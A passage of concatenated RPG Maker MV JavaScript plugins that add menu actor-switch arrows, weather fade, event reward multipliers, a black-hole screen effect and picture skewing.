			imgsp.position.set(x-xo+imgdx,y-yo+imgdy); // sp is moved in root.updateChildren
			sp.addChild(imgsp);
		}
	}
	this.bgImg_setupSp_切邊(sp);
},t).add('bgImg_setupSp_置中切',function f(sp){
	this.bgImg_setupSp_置中(sp);
	this.bgImg_setupSp_切邊(sp);
},t).add('bgImg_setupSp_切邊',function f(sp){
	sp.children.forEach(f.tbl[7],sp);
},t).add('bgImg_setupSp',function f(sp){
	const func=this[f.tbl[6][sp._type]];
	if(func){
		this.onclosed_clearBgImg(sp);
		return func.apply(this,arguments);
	}
},t).add('updateClose',function f(){
	const isClosed=this.isClosed();
	f.ori.apply(this,arguments);
	if(!isClosed && this.isClosed()) this.onclosed();
	return this._closing;
}).add('onclosed',function f(){
	const rtv=f.ori&&f.ori.apply(this,arguments);
	this.onclosed_clearBgImg();
	return rtv;
}).add('onclosed_clearBgImg',function f(sp){
	const p=sp||this._bgImgRoot;
	const arr=p&&p.children;
	if(arr){
		for(let x=arr.length;x--;) p.removeChildAt(x);
		if(p._id2sp) p._id2sp.clear();
	}
},t).add('update',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.bgImg_updateChildren();
	return rtv;
}).add('bgImg_updateChildren',function f(){
	const root=this.bgImg_getCont();
	{ const c=root.children; while(c.length) root.removeChildAt(c.length-1); }
	this.bgImg_updateRootPlacement();
	const arr=[];
	root._id2sp.forEach(f.tbl[0].bind(arr));
	root._wndw=this.width;
	root._wndh=this.height;
	arr.sort(f.tbl[1]).forEach(f.tbl[2],root);
},[
function f(v,k){ this.push(v); },
(spA,spB)=>spA._bgImgZ-spB._bgImgZ,
function f(sp){
	sp.x=this._wndw*sp._wndax;
	sp.y=this._wndh*sp._wnday;
	this.addChild(sp);
},
]);

})();


﻿"use strict";
/*:
 * @plugindesc 幫MOG新增觸控點換角
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const path_bgs=[
"BLR_custom/MainMenu/SubMenu/Common/PressQ_bg.png",
"BLR_custom/MainMenu/SubMenu/Common/PressW_bg.png",
],path_arrows=[
"BLR_custom/MainMenu/SubMenu/Common/PressQ_arrow.png",
"BLR_custom/MainMenu/SubMenu/Common/PressW_arrow.png",
];

const equipBtnSettingPath="BLR_custom/MainMenu/SubMenu/Equip/ActorSelBtnPos.txt";

new cfc(Scene_MenuBase.prototype).add('initialize',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.initialize_actorArrow();
	return rtv;
}).add('initialize_actorArrow',function f(){
	this._actorArrowH=this._actorArrowH|0;
	this._actorArrowCloserX=this._actorArrowCloserX;
	this._actorArrowDx=this._actorArrowDx;
	this._actorArrowDy=this._actorArrowDy;
	this._actorArrowRef=this._actorArrowRef;
	this._actorArrowAlphaRefRate=0.0625;
},undefined,false,true).add('create_actorArrow',function f(){
	// placeholder
},undefined,false,true).add('create_actorArrow_param',function f(ref,closerX,dx,dy,tMax,hArrow,arrowBtm,btnBgs,btnArrows){
	this._actorArrowRef=ref; if(!ref) return;
	const sw=ref.parent; if(!sw) return;
	this._actorArrowCloserX=closerX;
	this._actorArrowDx=dx;
	this._actorArrowDy=dy;
	this._actorArrowH=hArrow;
	
	const ua=sw._upArrowSprite,da=sw._downArrowSprite; if(!ua||!da) return;
	ua._alphaRefRate=this._actorArrowAlphaRefRate;
	da._alphaRefRate=this._actorArrowAlphaRefRate;
	const tmp=new Window_Base(0,0,256,1);
	const h=tmp.fittingHeight(1);
	f.tbl[0](da,tmp,h,"W",hArrow,arrowBtm);
	f.tbl[0](ua,tmp,h,"Q",hArrow,arrowBtm);
	da._t|=0;
	ua._t|=0;
	ua._tMax=da._tMax=Math.max(tMax-0||0,1);
	if(hArrow) ua._tMax=-ua._tMax;
	const arrows=[ua,da];
	for(let i=0,sz=arrows.length;i!==sz;++i){
		const a=arrows[i];
		const alpha=a._wordSp.alpha;
		if(btnBgs){
			const paths=btnBgs[0],scale=btnBgs[1]-0;
			if(paths[i]){
				const x=a._wordSp.x+a._wordSp.width*0.5,y=a._wordSp.y+a._wordSp.height*0.5;
				a._wordWindowSp=a._wordSp;
				if(a._wordSp&&a._wordSp.parent) a._wordSp.parent.removeChild(a._wordSp);
				a._wordSp=new Sprite(ImageManager.loadNormalBitmap(paths[i]));
				a._wordSp.alpha=alpha;
				a._wordSp.anchor.set(0.5,0.5);
				a._wordSp.position.set(x,y);
				a._wordSp.scale.set(isNaN(scale)?1:scale);
				a.addChild(a._wordSp);
			}
		}
		if(btnArrows){
			const paths=btnArrows[0],scale=btnArrows[1]-0;
			if(paths[i]){
				const sp=new Sprite(ImageManager.loadNormalBitmap(paths[i]));
				sp._anchorDx=hArrow?0.28125-i*0.5625:0;
				sp.anchor.set(0.5,0.5);
				sp.position.set(0,0);
				sp.scale.set(isNaN(scale)?1:scale);
				const alphaAdj=new Sprite();
				alphaAdj.addChild(a._arrowSp=sp);
				alphaAdj.alpha=alpha;
				a.addChild(alphaAdj);
			}else a._alphaRefRate=f.tbl[1];
		}else a._alphaRefRate=f.tbl[1];
	}
},[
(arrow,tmp,h,txt,hArrow,arrowBtm)=>{
	const w=(tmp.standardPadding()<<1)+(tmp.textPadding()<<1)+~~(tmp.textWidth(txt)+1);
	const sp=arrowBtm?new Window_Base(-w*0.5,-h*0.5-arrow.height,w,h):new Window_Base(-w*0.5,-h*0.5+arrow.height,w,h);
	sp.alpha=13;
	//sp._windowFrameSprite.visible=sp._windowBackSprite.visible=0;
	sp.drawTextEx('\\TXTCENTER:'+JSON.stringify(txt)+'',0,0);
	makeDummyWindowProto(sp);
	arrow.addChild(arrow._wordSp=sp);
},
0.5,
],false,true).add('update_actorArrow_updatePlacement',function f(da,ua,ref,closerX,dx,dy){
	// supposed 'ref instanceof Sprite' is true
	const y=ref.y+ref.height*(0.5-ref.anchor.y);
	const ax=ref.anchor.x;
	if(this._actorArrowH){
		ua.position.set(ref.x+closerX-ref.width*    ax  -ua.width*       0.5       +dx,y+dy);
		da.position.set(ref.x-closerX+ref.width* (1-ax) +da.width*       0.5       +dx,y+dy);
	}else{
		ua.position.set(ref.x+closerX-ref.width*    ax  -ua.width* (1-ua.anchor.x) +dx,y+dy);
		da.position.set(ref.x-closerX+ref.width* (1-ax) +da.width*    da.anchor.x  +dx,y+dy);
	}
	for(let x=2,arr=arguments;x--;){
		const a=arr[x];
		if(a._wordWindowSp){ const bmp=a._wordSp.bitmap; if(f.tbl[0](bmp)){
			const p=a._wordSp.parent; if(p) p.removeChild(a._wordSp);
			p.addChild(a._wordSp=a._wordWindowSp);
			a._wordWindowSp=undefined;
			a._alphaRefRate=f.tbl[1][0];
			a._wordSp.alpha=f.tbl[1][1];
		} }
		a.alpha=ref.alpha*a._alphaRefRate;
	}
},[
bmp=>bmp.isReady() && Math.max(bmp.width,bmp.height)<2,
[0.5,1.5],
],false,true).add('update_actorArrow_onclick',function f(){
	const ref=this._actorArrowRef;
	if(!ref||!TouchInput.isTriggered()) return;
	const sw=ref.parent; if(!sw) return; // should be existed already
	const ua=sw._upArrowSprite,da=sw._downArrowSprite;
	if(!ua||!da||!$gameParty) return;
	const x=TouchInput.x,y=TouchInput.y;
	let ud=0;
	if(sw.downArrowVisible){
		const dpt=da.toLocal({x:x,y:y}),dptWord={x:dpt.x-da._wordSp.x,y:dpt.y-da._wordSp.y,};
		ud+=!!(f.tbl[0](da,dpt)||f.tbl[0](da._wordSp,dptWord));
	}
	if(sw.upArrowVisible){
		const upt=ua.toLocal({x:x,y:y}),uptWord={x:upt.x-ua._wordSp.x,y:upt.y-ua._wordSp.y,};
		ud-=!!(f.tbl[0](ua,upt)||f.tbl[0](ua._wordSp,uptWord));
	}
	if(ud){
		SoundManager.playCursor();
		(ud<0)?this.previousActor():this.nextActor();
	}
},[
(sp,localPoint)=>{
	const a=sp.anchor,s=sp.scale;
	const ax=a?a.x:0;
	const ay=a?a.y:0;
	const w=s.x*sp.width;
	const h=s.y*sp.height;
	return new Rectangle(-ax*w,-ay*h,w,h).contains(localPoint.x,localPoint.y);
},
],false,true).add('update_actorArrow_display',function f(){
	const ref=this._actorArrowRef; if(!ref) return;
	const sw=ref.parent; if(!sw) return; // should be existed already
	const ua=sw._upArrowSprite,da=sw._downArrowSprite;
	if(!ua||!da||!$gameParty) return;
	if(!($gameParty._actors.length>=2)){ sw.upArrowVisible=sw.downArrowVisible=false; return; }
	sw.upArrowVisible=sw.downArrowVisible=true;
	this.update_actorArrow_updatePlacement(da,ua,ref,this._actorArrowCloserX-0||0,this._actorArrowDx-0||0,this._actorArrowDy-0||0);
	const idx=this._actorArrowH|0;
	f.tbl[idx](da);
	f.tbl[idx](ua);
},[
sp=>{
	sp.anchor.y=Math.sin(sp._t++/sp._tMax*Math.PI)+0.5;
	sp._t%=sp._tMax;
	if(sp._arrowSp && sp._arrowSp.anchor) sp._arrowSp.anchor.y=sp.anchor.y;
},
sp=>{
	sp.anchor.x=Math.sin(sp._t++/sp._tMax*Math.PI)+0.5;
	sp._t%=Math.abs(sp._tMax);
	if(sp._arrowSp && sp._arrowSp.anchor){
		sp.anchor.x+=sp._arrowSp._anchorDx;
		sp._arrowSp.anchor.x=sp.anchor.x;
	}
},
],false,true).add('update_actorArrow',function f(){
	this.update_actorArrow_display();
	this.update_actorArrow_onclick();
},false,true);

if(typeof _mog_scnSkill_create!=='undefined') new cfc(Scene_Skill.prototype).add('create',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.create_actorArrow();
	return rtv;
}).add('create_actorArrow',function f(){
	const sw=this._helpWindow; if(!sw) return;
	const ref=sw&&sw._windowContentsSprite; if(!ref) return;
	this.create_actorArrow_param(ref,f.tbl[0],f.tbl[1],f.tbl[2],f.tbl[3],f.tbl[4],f.tbl[5],f.tbl[6],f.tbl[7]);
	return ref;
},[
196, // 0: this._actorArrowCloserX: adjust width. positive for getting closer each
-1.5, // 1: this._actorArrowDx: adjust x, dx.  x+dx
-517, // 2: this._actorArrowDy: adjust y, dy.  y+dy
64, // 3: tMax
true, // 4: use LR instead of UD ?
true, // 5: arrow at bottom?
[path_bgs,1], // 6: btn bg path, scale
[path_arrows,1], // 7: btn arrow path, scale
],false,true).add('update',function f(){
	if(this._updating) return;
	this._updating=true;
	const rtv=f.ori.apply(this,arguments);
	this.update_actorArrow();
	this._updating=false;
	return rtv;
});

if(typeof _mog_scEquipM_create!=='undefined') new cfc(Scene_Equip.prototype).add('create',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.create_parseActorSelBtnPos();
	this.create_actorArrow();
	this.createFaceSprite();
	return rtv;
}).add('initialize',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._faceX=this._faceX;
	this._faceY=this._faceY;
	ImageManager.otherFiles_addLoad(f.tbl[0]);
	return rtv;
},t=[
equipBtnSettingPath,
new Map([
['closeX','_actorArrowCloserX'],
['dx','_actorArrowDx'],
['dy','_actorArrowDy'],
['faceX','_faceX'],
['nameX','_nameX'],
['nameY','_nameY'],
['nameFontSize','_nameFontSize'],
]), // 1: keys in txt to properties
[/\r/g,''], // 2: replace
['\n','='], // 3: spliters
]).add('create_parseActorSelBtnPos',function f(){
	// key=val
	const raw=ImageManager.otherFiles_getData(f.tbl[0]);
	if(!raw) return;
	const arr=raw.replace(f.tbl[2][0],f.tbl[2][1]).split(f.tbl[3][0]);
	for(let x=0,xs=arr.length;x!==xs;++x){
		if(!arr[x]) continue;
		const idx=arr[x].indexOf('=');
		if(idx<0) continue; // not supported in this case
		const key=arr[x].slice(0,idx);
		const pname=f.tbl[1].get(key);
		if(!pname) continue;
		this[pname]=arr[x].slice(idx+1)-0||0;
	}
},t).add('create_actorArrow',function f(){
	const sw=this._statusWindow; if(!sw) return;
	const ref=sw&&sw._faceSprite; if(!ref) return;
	this.create_actorArrow_param(ref,
		useDefaultIfIsNaN(this._actorArrowCloserX,f.tbl[0]),
		useDefaultIfIsNaN(this._actorArrowDx,f.tbl[1]),
		useDefaultIfIsNaN(this._actorArrowDy,f.tbl[2]),
	f.tbl[3],f.tbl[4],f.tbl[5],f.tbl[6],f.tbl[7]);
	return ref;
},[
24, // 0: this._actorArrowCloserX: adjust width. positive for getting closer each
8, // 1: this._actorArrowDx: adjust x, dx.  x+dx
-121, // 2: this._actorArrowDy: adjust y, dy.  y+dy
64, // 3: tMax
true, // 4: use LR instead of UD ?
true, // 5: arrow at bottom?
[path_bgs,1], // 6: btn bg path, scale
[path_arrows,1], // 7: btn arrow path, scale
],false,true).add('update',function f(){
	if(this._updating) return;
	this._updating=true;
	const rtv=f.ori.apply(this,arguments);
	this.update_actorArrow();
	this.update_nameWindow();
	this._updating=false;
	return rtv;
}).add('createFaceSprite',function f(){
	const sw=this._statusWindow; if(!sw) return;
	if(!sw._faceSprite) sw.createFaceSprite();
	const sp=sw._faceSprite;
	sp.position.set(useDefaultIfIsNaN(this._faceX,sp.x),useDefaultIfIsNaN(this._faceY,sp.y));
	sw.drawActorName=f.tbl[0].bind(this);
	sw._sc=this;
	sw.refresh();
	return sp;
},[
function f(){
	const ref=this._statusWindow;
	let wnd=this._nameWindow;
	if(!wnd){
		wnd=this._nameWindow=new Window_Base(0,0,ref.width,ref.height);
		makeDummyWindowProto(wnd);
		ref.addChild(wnd);
		wnd._windowFrameSprite.visible=wnd._windowBackSprite.visible=0;
	}
	const bmp=wnd.contents;
	bmp.clear();
	bmp.fontSize=useDefaultIfIsNaN(this._nameFontSize,ref.contents.fontSize);
	arguments[1]=useDefaultIfIsNaN(this._nameX-((arguments[0] instanceof Game_Actor)?ref.textWidth(arguments[0].name())>>1:0),arguments[1]);
	arguments[2]=useDefaultIfIsNaN(this._nameY,arguments[2]);
	wnd.drawActorName.apply(wnd,arguments);
},
]).add('update_nameWindow',function f(){
	const ref=this._statusWindow; if(!ref) return;
	this._nameWindow.alpha=ref._windowContentsSprite.alpha;
});

if(typeof _mog_scStatusM_create!=='undefined') new cfc(Scene_Status.prototype).add('createMeters',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.create_actorArrow();
	return rtv;
}).add('create_actorArrow',function f(){
	const sw=this._statusWindow; if(!sw) return;
	const ref=sw&&sw._windowContentsSprite; if(!ref) return;
	const ua=sw._upArrowSprite,da=sw._downArrowSprite;
	if(!ua||!da){
		sw.addChild(sw._downArrowSprite=new Sprite());
		sw.addChild(sw._upArrowSprite=new Sprite());
		Window_Base.prototype._refreshArrows.call(sw);
	}
	this.create_actorArrow_param(ref,f.tbl[0],f.tbl[1],f.tbl[2],f.tbl[3],f.tbl[4],f.tbl[5],f.tbl[6],f.tbl[7]);
	return ref;
},[
363.5, // 0: this._actorArrowCloserX: adjust width. positive for getting closer each
-175, // 1: this._actorArrowDx: adjust x, dx.  x+dx
-260, // 2: this._actorArrowDy: adjust y, dy.  y+dy
64, // 3: tMax
true, // 4: use LR instead of UD ?
true, // 5: arrow at bottom?
[path_bgs,1], // 6: btn bg path, scale
[path_arrows,1], // 7: btn arrow path, scale
]).add('update',function f(){
	if(this._updating) return;
	this._updating=true;
	const rtv=f.ori.apply(this,arguments);
	this.update_actorArrow();
	this._updating=false;
	return rtv;
});

})();


﻿"use strict";
/*:
 * @plugindesc MOG天氣淡出 // alpha changing
 * @author agold404
 * @help ㄌㄐ插件做一半
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

if(('undefined'!==typeof Imported) && Imported.MOG_Weather_EX){
new cfc(SpriteWeatherEX.prototype).add('update',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.mogWeatherEX_UpdateChAlpha(this._id);
	return rtv;
}).add('mogWeatherEX_UpdateChAlpha',function f(id){
	const arr=$gameSystem._weatherEX_Data;
	const info=arr&&arr[id]&&arr[id]._chAlpha; if(!info) return;
	const sp=this;
	const r=Math.min(1,++info.dur/info.durMax);
	if(info.durMax<info.dur) info.dur=info.durMax;
	sp.alpha=(1-r)*info.from+r*info.to;
},undefined,false,true);
new cfc(Game_System.prototype).add('mogWeatherEx_chAlpha',function f(id,dur,from,to){
	if(!(0<(dur|=0))) return;
	return this._weatherEX_Data[id]._chAlpha={
		dur:0,
		durMax:dur,
		from:from,
		to:to,
	};
});
}

})();


﻿"use strict";
/*:
 * @plugindesc 事件獲得增加
 * @author agold404
 * @help 有 trait 的 note ，先算倍再算加
 * 
<事件獲得增加金幣量:500>
<事件獲得增加金幣倍:2>
<事件獲得增加道具量:[[id,量],["all",量]]>
<事件獲得增加道具倍:[[id,倍],["all",倍]]>
<事件獲得增加防具量:[[id,量],["all",量]]>
<事件獲得增加防具倍:[[id,倍],["all",倍]]>
<事件獲得增加武器量:[[id,量],["all",量]]>
<事件獲得增加武器倍:[[id,倍],["all",倍]]>
 * 
 * This plugin can be renamed as you want.
 */

if(!window.addEnum) window.addEnum=function(key){
	if(this[key]) return;
	this._enumMax|=0;
	this[key]=++this._enumMax;
	return this;
};

(()=>{ let k,r,t; const gbb=Game_BattlerBase;

if(!gbb._enumMax) gbb._enumMax=404;
if(!gbb.addEnum) gbb.addEnum=window.addEnum;

const prefix='事件獲得增加';
const kw_gold=prefix+'金幣';
const kw_gold_mul=kw_gold+'倍';
const kw_gold_add=kw_gold+'量';
const kw_item=prefix+'道具';
const kw_item_mul=kw_item+'倍';
const kw_item_add=kw_item+'量';
const kw_armor=prefix+'防具';
const kw_armor_mul=kw_armor+'倍';
const kw_armor_add=kw_armor+'量';
const kw_weapon=prefix+'武器';
const kw_weapon_mul=prefix+'倍';
const kw_weapon_add=prefix+'量';
const kwt_gold_mul='TRAIT_'+kw_gold_mul;
const kwt_gold_add='TRAIT_'+kw_gold_add;
const kwt_item_mul='TRAIT_'+kw_item_mul;
const kwt_item_add='TRAIT_'+kw_item_add;
const kwt_armor_mul='TRAIT_'+kw_armor_mul;
const kwt_armor_add='TRAIT_'+kw_armor_add;
const kwt_weapon_mul='TRAIT_'+kw_weapon_mul;
const kwt_weapon_add='TRAIT_'+kw_weapon_add;
gbb.addEnum(kwt_gold_mul);
gbb.addEnum(kwt_gold_add);
gbb.addEnum(kwt_item_mul);
gbb.addEnum(kwt_item_add);
gbb.addEnum(kwt_armor_mul);
gbb.addEnum(kwt_armor_add);
gbb.addEnum(kwt_weapon_mul);
gbb.addEnum(kwt_weapon_add);
const cal_kw_gold='cal_'+kw_gold;
const cal_kw_item='cal_'+kw_item;
const cal_kw_armor='cal_'+kw_armor;
const cal_kw_weapon='cal_'+kw_weapon;

const putMul=(ts,key,id,val)=>{ val-=0;
	if(!isNaN(val)) ts.push({code:gbb[key],dataId:id,value:val,});
},putAdd=(ts,key,id,val)=>{ val-=0;
	if(val) ts.push({code:gbb[key],dataId:id,value:val,});
};
new cfc(Scene_Boot.prototype).add('start',function f(){
	$dataActors  .forEach(f.tbl[0]);
	$dataClasses .forEach(f.tbl[0]);
	$dataSkills  .forEach(f.tbl[0]);
	$dataItems   .forEach(f.tbl[0]);
	$dataWeapons .forEach(f.tbl[0]);
	$dataArmors  .forEach(f.tbl[0]);
	$dataEnemies .forEach(f.tbl[0]);
	$dataTroops  .forEach(f.tbl[0]);
	$dataStates  .forEach(f.tbl[0]);
	return f.ori.apply(this,arguments);
},[
dataobj=>{ const meta=dataobj&&dataobj.meta; if(!meta) return;
	let ts=dataobj.traits; if(!ts) ts=dataobj.traits=[];
	putMul(ts,kwt_gold_mul,0,meta[kw_gold_mul]-0);
	putAdd(ts,kwt_gold_add,0,meta[kw_gold_add]-0);
	if(meta[kw_item_mul]) for(let arr=JSON.parse(meta[kw_item_mul]),x=arr.length;x--;) putMul(ts,kwt_item_mul,arr[x][0],arr[x][1]);
	if(meta[kw_item_add]) for(let arr=JSON.parse(meta[kw_item_add]),x=arr.length;x--;) putAdd(ts,kwt_item_add,arr[x][0],arr[x][1]);
	if(meta[kw_armor_mul]) for(let arr=JSON.parse(meta[kw_armor_mul]),x=arr.length;x--;) putMul(ts,kwt_armor_mul,arr[x][0],arr[x][1]);
	if(meta[kw_armor_add]) for(let arr=JSON.parse(meta[kw_armor_add]),x=arr.length;x--;) putAdd(ts,kwt_armor_add,arr[x][0],arr[x][1]);
	if(meta[kw_weapon_mul]) for(let arr=JSON.parse(meta[kw_weapon_mul]),x=arr.length;x--;) putMul(ts,kwt_weapon_mul,arr[x][0],arr[x][1]);
	if(meta[kw_weapon_add]) for(let arr=JSON.parse(meta[kw_weapon_add]),x=arr.length;x--;) putAdd(ts,kwt_weapon_add,arr[x][0],arr[x][1]);
},
]);

new cfc(Game_Battler.prototype).add(cal_kw_gold,function f(val){
	const muls=this.traitsPi(f.tbl[0],0),adds=this.traitsSum(f.tbl[1],0);
	return val*muls+adds;
},[
gbb[kwt_gold_mul],
gbb[kwt_gold_add],
]).add(cal_kw_item,function f(val,dataobj){ const id=dataobj&&dataobj.id;
	const muls=this.traitsPi(f.tbl[0],id)*this.traitsPi(f.tbl[0],'all'),adds=this.traitsSum(f.tbl[1],id)+this.traitsSum(f.tbl[1],'all');
	return val*muls+adds;
},[
gbb[kwt_item_mul],
gbb[kwt_item_add],
]).add(cal_kw_armor,function f(val,dataobj){ const id=dataobj&&dataobj.id;
	const muls=this.traitsPi(f.tbl[0],id)*this.traitsPi(f.tbl[0],'all'),adds=this.traitsSum(f.tbl[1],id)+this.traitsSum(f.tbl[1],'all');
	return val*muls+adds;
},[
gbb[kwt_armor_mul],
gbb[kwt_armor_add],
]).add(cal_kw_weapon,function f(val,dataobj){ const id=dataobj&&dataobj.id;
	const muls=this.traitsPi(f.tbl[0],id)*this.traitsPi(f.tbl[0],'all'),adds=this.traitsSum(f.tbl[1],id)+this.traitsSum(f.tbl[1],'all');
	return val*muls+adds;
},[
gbb[kwt_weapon_mul],
gbb[kwt_weapon_add],
]);

new cfc(Game_Interpreter.prototype).add('command125',function f(){
	let value = this.operateValue(this._params[0], this._params[1], this._params[2]);
	if(0<value){
		const v0=value;
		for(let arr=$gameParty.members(),x=arr.length;x--;) value=Math.max(arr[x][f.tbl[0]](v0),value);
	}
	$gameParty.gainGold(value|0);
	return true;
},[
cal_kw_gold,
]).add('cmdCommon_gainThings',function f(dataobjv,cal_kw){
	const dataobj=dataobjv[this._params[0]];
	let n=this.operateValue(this._params[1], this._params[2], this._params[3]);
	if(0<n){
		const v0=n;
		for(let arr=$gameParty.members(),x=arr.length;x--;) n=Math.max(arr[x][cal_kw](v0,dataobj),n);
	}
	$gameParty.gainItem(dataobj,n|0,this._params[4]);
	return true;
}).add('command126',function f(){
	return this.cmdCommon_gainThings($dataItems,f.tbl[0]);
},[
cal_kw_item,
]).add('command127',function f(){
	return this.cmdCommon_gainThings($dataWeapons,f.tbl[0]);
},[
cal_kw_weapon,
]).add('command128',function f(){
	return this.cmdCommon_gainThings($dataArmors,f.tbl[0]);
},[
cal_kw_armor,
]);

})();


﻿"use strict";
/*:
 * @plugindesc black holes visual effect api
 * @author agold404
 * @help $gameScreen.renderBlackHolesEffect_genHole({x:384,y:256,r:0,},{x:512,y:512,r:128,},0,64,8);
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Graphics).add('renderOtherEffects',function f(){
	this.renderBlackHolesEffect();
	return f.ori.apply(this,arguments);
}).add('renderBlackHolesEffect',function f(){
	const d=document;
	if(!f.tbl[1]){
		const div=d.ce('div').sa('style',this._canvas.ga('style'));
		div.width=this._canvas.width;
		div.height=this._canvas.height;
		d.body.ac(div.ac(f.tbl[1]=d.ce('canvas').sa('style','width:100%;height:100%;')));
		this.addAsGameCanvas(div);
	}
	const dstCanvas=f.tbl[1];
	const dstCtx=f.tbl[2]||(f.tbl[2]=dstCanvas.getContext('2d'));
	const dstW=~~(f.tbl[3]*this._canvas.width),dstH=~~(f.tbl[3]*this._canvas.height);
	{ let needClear=true;
	if(dstCanvas.width!==dstW){ dstCanvas.width=dstW; needClear=false; }
	if(dstCanvas.height!==dstH){ dstCanvas.height=dstH; needClear=false; }
	if(needClear) dstCtx.clearRect(0,0,dstW,dstH);
	}
	if(Graphics.frameCount<f.tbl[0]) f.tbl[0]=Graphics.frameCount; // new game or load game
	const dfc=Graphics.frameCount-f.tbl[0];
	f.tbl[0]=Graphics.frameCount;
	
	if(!$gameScreen) return;
	const cont=$gameScreen.renderBlackHolesEffect_getCont(); if(!cont.length) return;
	
	const srcData=this.getImageData(),dstData=dstCtx.getImageData(0,0,dstW,dstH);
	const infos=cont.slice(); cont.length=0;
	for(let i=0,sz=infos.length;i!==sz;++i){
		const info=infos[i];
		const opt=info.opt;
		info.dur+=dfc;
		
		const r1=info.dur/info.fadeOutFc; if(!(1>=r1)) continue;
		const r0=1-r1;
		let refX=0,refY=0,sp;
		if(!isNaN(opt.evtId)){
			if(!SceneManager.isScene_map()) continue;
			const chr=$gameMap._events[opt.evtId]||$gamePlayer;
			sp=chr&&chr.getSprite(); if(!sp) continue;
		}else if(opt.btlr){
			if(!SceneManager.isScene_battle()) continue;
			sp=opt.btlr.getSprite(); if(!sp) continue;
		}
		if(sp){
			refX=sp.x;
			refY=sp.y;
		}
		const holeX=refX+info.holeXyr0.x*r0+info.holeXyr1.x*r1;
		const holeY=refY+info.holeXyr0.y*r0+info.holeXyr1.y*r1;
		const holeR=info.holeXyr0.r*r0+info.holeXyr1.r*r1;
		const alpha=info.dur>=info.fadeInFc?info.keepFc<info.dur?(info.fadeOutFc-info.dur)/(info.fadeOutFc-info.keepFc):1:info.dur/info.fadeInFc;
		
		this.renderBlackHolesEffect_drawHole1(srcData,dstData,f.tbl[3],alpha,holeX,holeY,holeR,opt&&opt.holeCenterColor);
		cont.push(info);
	}
	dstCtx.putImageData(dstData,0,0);
},[
0, // 0: fc
undefined, // 1: canvas
undefined, // 2: ctx
0.25, // 3: dstScale
]).add('renderBlackHolesEffect_drawHole1',function f(srcData,dstData,dstScale,alpha,holeX,holeY,holeR,holeCenterColor){
	if(!(0<dstScale)||!(0<holeR)) return;
	holeCenterColor=holeCenterColor||f.tbl[0];
	
	const r=holeR*dstScale,ox=~~(holeX*dstScale),oy=~~(holeY*dstScale),dstW=dstData.width,srcW=srcData.width,srcW_1=srcW-1,srcH_1=srcData.height-1,isWebGL=this.isWebGL();
	const r2=r*r,yL=Math.min(oy+r,dstData.height-1)|0,xL=Math.min(ox+r,dstW-1)|0,x0=Math.max(ox-r,0)|0;
	for(let y=Math.max(oy-r,0)|0;y<=yL;++y){ for(let x=x0;x<=xL;++x){
		const dx=x-ox,dy=y-oy,dist2=dx*dx+dy*dy; if(r2<dist2) continue;
		const dstIdx=(y*dstW+x)<<2;
		const rad01=Math.sqrt(dist2/r2);
		let dx1=dx/rad01,dy1=dy/rad01;
		const dstX1=ox+dx1,dstY1=oy+dy1;
		const dstX1c=dstX1.clamp(0,xL),dstY1c=dstY1.clamp(0,yL);
		const r1x=(dstX1c-ox)/dx1,r1y=(dstY1c-oy)/dy1;
		const r1c=Math.min(r1x||Infinity,r1y||Infinity);
		dx1*=r1c; dy1*=r1c;
		const dstIdx1=((~~(oy+dy1)).clamp(0,yL)*dstW+(~~(ox+dx1)).clamp(0,xL))<<2;
		const srcX=(~~(holeX+dx1/dstScale)).clamp(0,srcW_1),srcY=(~~(holeY+dy1/dstScale)).clamp(0,srcH_1);
		const srcIdx=((isWebGL?srcH_1-srcY:srcY)*srcW+srcX)<<2,p=rad01;
		const q=1-p,dstAR1=dstData.data[dstIdx1|3]/255;
		const srcAR1=1-dstAR1;
		for(let c=0;c!==4;++c){
			const srcC=(srcAR1*srcData.data[srcIdx|c]+dstAR1*dstData.data[dstIdx1|c]);
			dstData.data[dstIdx|c]=(1-alpha)*dstData.data[dstIdx|c]+alpha*(srcC*p+holeCenterColor[c]*q);
		}
	} }
},[
[0,0,0,255], // 0: default hole center color
]).add('renderBlackHolesEffect_dstScale',()=>0.25);

new cfc(Game_Screen.prototype).add('renderBlackHolesEffect_getCont',function f(){
	let rtv=this._renderBlackHolesEffectv; if(!rtv) rtv=this._renderBlackHolesEffectv=[];
	return rtv;
}).add('renderBlackHolesEffect_genHole',function f(holeXyr0,holeXyr1,fadeInFc,keepFc,fadeOutFc,opt){
	if(!holeXyr0) holeXyr0=holeXyr1;
	if(!holeXyr1) holeXyr1=holeXyr0;
	if(!holeXyr0||!holeXyr1) return;
	const r0=holeXyr0.r|0,r1=holeXyr1.r|0; if(!r0&&!r1) return;
	holeXyr0.x|=0;
	holeXyr0.y|=0;
	holeXyr1.x|=0;
	holeXyr1.y|=0;
	fadeInFc|=0;
	keepFc|=0;
	fadeOutFc|=0;
	keepFc+=fadeInFc;
	fadeOutFc+=keepFc;
	if(!(0<fadeOutFc)) return;
	
	opt=opt||{};
	this.renderBlackHolesEffect_getCont().push({
		holeXyr0:holeXyr0,
		holeXyr1:holeXyr1,
		dur:0,
		fadeInFc:fadeInFc,
		keepFc:keepFc,
		fadeOutFc:fadeOutFc,
		opt:opt,
	});
});

})();


﻿"use strict";
/*:
 * @plugindesc 圖片歪斜API
 * @author agold404
 * @help 僅直接使用PIXI的skew
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Game_Picture.prototype).add('initBasic',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.initSkew();
	return rtv;
}).add('initSkew',function f(){
	this.setSkew(0,0);
	return this;
}).add('setSkew',function f(x,y,d){
	this._skewDur=d||0;
	if(undefined!==x) this._skewTX=x;
	if(undefined!==y) this._skewTY=y;
	this.updateSkew();
	return this;
}).add('show',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.initSkew();
	return rtv;
}).add('updateSkew',function f(){
	if(1<this._skewDur){
		--this._skewDur;
		this._skewX+=(this._skewTX-this._skewX)/this._skewDur;
		this._skewY+=(this._skewTY-this._skewY)/this._skewDur;
	}else{
		this._skewDur=0;
